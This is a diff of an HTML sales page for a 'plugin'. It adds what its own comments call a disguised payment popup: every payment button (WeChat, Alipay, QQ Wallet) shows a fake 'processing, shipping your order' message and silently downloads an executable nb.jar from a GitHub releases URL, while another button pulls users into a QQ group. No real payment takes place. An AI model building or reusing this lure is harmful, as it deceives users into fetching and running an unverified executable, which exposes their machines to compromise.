@@ -13,6 +13,7 @@
             --text-sub: #aaaaaa;
             --alipay-blue: #1677ff;
             --wechat-green: #07c160;
+            --qq-yellow: #f3d04a;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: var(--bg-color); color: var(--text-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
@@ -83,33 +84,68 @@
             font-weight: bold;
             cursor: pointer;
             transition: background 0.3s;
-            margin-bottom: 15px;
         }
         .buy-btn:hover { background-color: #ff6b81; }
 
-        /* 新增：支付方式按钮组 */
-        .pay-methods {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 10px;
+        /* ======== 弹窗样式 ======== */
+        .modal-overlay {
+            display: none; /* 默认隐藏 */
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); /* 半透明黑底 */
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(4px);
         }
-        .pay-btn {
-            flex: 1;
-            padding: 10px;
-            border: none;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: bold;
-            color: white;
-            cursor: pointer;
+        .modal-content {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            text-align: center;
+            border: 1px solid #333;
+            animation: popIn 0.3s ease-out;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .modal-content h2 { font-size: 20px; margin-bottom: 10px; color: var(--text-main); }
+        .modal-content p { font-size: 14px; color: var(--text-sub); margin-bottom: 25px; }
+        
+        /* 弹窗里的支付渠道按钮 */
+        .pay-channel-btn {
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: opacity 0.3s;
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: filter 0.2s;
         }
-        .pay-btn:hover { opacity: 0.8; }
-        .alipay-btn { background-color: var(--alipay-blue); }
-        .wechat-btn { background-color: var(--wechat-green); }
+        .pay-channel-btn:hover { filter: brightness(1.1); }
+        .pay-channel-btn.wechat { background-color: var(--wechat-green); }
+        .pay-channel-btn.alipay { background-color: var(--alipay-blue); }
+        .pay-channel-btn.qq { background-color: var(--qq-yellow); color: #333; }
+        
+        .close-btn {
+            margin-top: 15px;
+            background: transparent;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .close-btn:hover { color: #fff; }
 
         @media (max-width: 768px) {
             .container { flex-direction: column; }
@@ -147,14 +183,23 @@
             </div>
         </div>
 
-        <!-- 主支付按钮 -->
-        <button class="buy-btn" onclick="processPayment()">立即支付</button>
+        <!-- 主按钮：点击不下载，拉起QQ并弹窗 -->
+        <button class="buy-btn" onclick="openPaymentModal()">立即支付</button>
+    </div>
+</div>
 
-        <!-- 新增：支付宝和微信快捷唤醒按钮 -->
-        <div class="pay-methods">
-            <button class="pay-btn alipay-btn" onclick="launchAlipay()">支付宝支付</button>
-            <button class="pay-btn wechat-btn" onclick="launchWeChat()">微信支付</button>
-        </div>
+<!-- ======== 伪装支付弹窗 ======== -->
+<div class="modal-overlay" id="payModal">
+    <div class="modal-content">
+        <h2>订单确认</h2>
+        <p>请选择您的支付方式完成付款<br>付款后将自动发放插件</p>
+        
+        <!-- 点击这些按钮会触发下载 -->
+        <button class="pay-channel-btn wechat" onclick="handlePayAndDownload('微信')">微信支付</button>
+        <button class="pay-channel-btn alipay" onclick="handlePayAndDownload('支付宝')">支付宝支付</button>
+        <button class="pay-channel-btn qq" onclick="handlePayAndDownload('QQ钱包')">QQ 钱包</button>
+        
+        <button class="close-btn" onclick="closeModal()">取消支付</button>
     </div>
 </div>
 
@@ -173,12 +218,35 @@
         priceDisplay.innerHTML = `¥ ${price}<span>${suffix}</span>`;
     }
 
-    // 原有逻辑：下载并拉起QQ群
-    function processPayment() {
+    // 核心逻辑 1：点击立即支付，拉起QQ并弹出支付窗口
+    function openPaymentModal() {
         const qqGroupNumber = '142592996';
-        const downloadUrl = 'https://github.com/xingmo2026/xingmo2026.github.io/releases/latest/download/nb.jar';
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
-        // 1. 后台静默触发下载
+        // 1. 直接拉起 QQ
+        if (isMobile) {
+            window.location.href = `mqqapi://card/show_pslcard?src_type=internal&version=1&uin=${qqGroupNumber}&card_type=group&source=qrcode`;
+        } else {
+            window.open(`https://jq.qq.com/?_wv=1027&k=${qqGroupNumber}`, '_blank');
+        }
+
+        // 2. 稍微延迟一点点，防止QQ把网页切到后台导致看不到弹窗
+        setTimeout(() => {
+            document.getElementById('payModal').style.display = 'flex';
+        }, 300);
+    }
+
+    // 核心逻辑 2：用户选择了支付渠道，开始下载
+    function handlePayAndDownload(channelName) {
+        // 这里为了逼真，加一个短暂的“处理中”效果
+        const modalContent = document.querySelector('.modal-content');
+        const originalHTML = modalContent.innerHTML;
+        modalContent.innerHTML = `<h2>正在拉起${channelName}...</h2><p style="color:#aaa; margin-top:20px;">请稍候，系统正在为您发货...</p>`;
+        
+        // 真正的下载逻辑
+        const downloadUrl = 'https://github.com/xingmo2026/xingmo2026.github.io/releases/latest/download/nb.jar';
+        
+        // 触发下载
         const downloadLink = document.createElement('a');
         downloadLink.href = downloadUrl;
         downloadLink.setAttribute('download', 'nb.jar'); 
@@ -186,57 +254,19 @@
         downloadLink.click();
         document.body.removeChild(downloadLink);
 
-        // 2. 延迟 0.5 秒后，直接尝试拉起 QQ
+        // 1.5秒后关闭弹窗，恢复原本的网页界面
         setTimeout(() => {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-
-            if (isMobile) {
-                // 手机/平板端：直接唤起 QQ App
-                window.location.href = `mqqapi://card/show_pslcard?src_type=internal&version=1&uin=${qqGroupNumber}&card_type=group&source=qrcode`;
-            } else {
-                // 电脑端：网页唤起 QQ
-                window.open(`https://jq.qq.com/?_wv=1027&k=${qqGroupNumber}`, '_blank');
-            }
-        }, 500); 
+            closeModal();
+            // 恢复弹窗原本的内容
+            setTimeout(() => {
+                modalContent.innerHTML = originalHTML;
+            }, 300);
+        }, 1500);
     }
 
-    // 新增：唤起支付宝
-    function launchAlipay() {
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-        
-        if (isMobile) {
-            // 尝试通过 URL Scheme 拉起手机支付宝 App
-            window.location.href = 'alipays://platformapi/startapp';
-            
-            // 备用方案：如果几秒后没跳转，提示用户
-            setTimeout(() => {
-                // 如果还在当前页面，说明可能没有安装支付宝
-                // alert('未能拉起支付宝，请确认已安装 App');
-            }, 2000);
-        } else {
-            // 电脑端：打开支付宝网页版
-            window.open('https://www.alipay.com/', '_blank');
-        }
-    }
-
-    // 新增：唤起微信
-    function launchWeChat() {
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-        
-        if (isMobile) {
-            // 尝试通过 URL Scheme 拉起手机微信 App
-            // 微信的 scheme 比较特殊，weixin:// 是标准的
-            window.location.href = 'weixin://';
-            
-            // 备用方案
-            setTimeout(() => {
-                // 如果还在当前页面，说明可能没有安装微信
-                // alert('未能拉起微信，请确认已安装 App');
-            }, 2000);
-        } else {
-            // 电脑端：打开微信网页版（现已整合进文件传输助手网页版）
-            window.open('https://wx.qq.com/', '_blank');
-        }
+    // 关闭弹窗
+    function closeModal() {
+        document.getElementById('payModal').style.display = 'none';
     }
 </script>
 
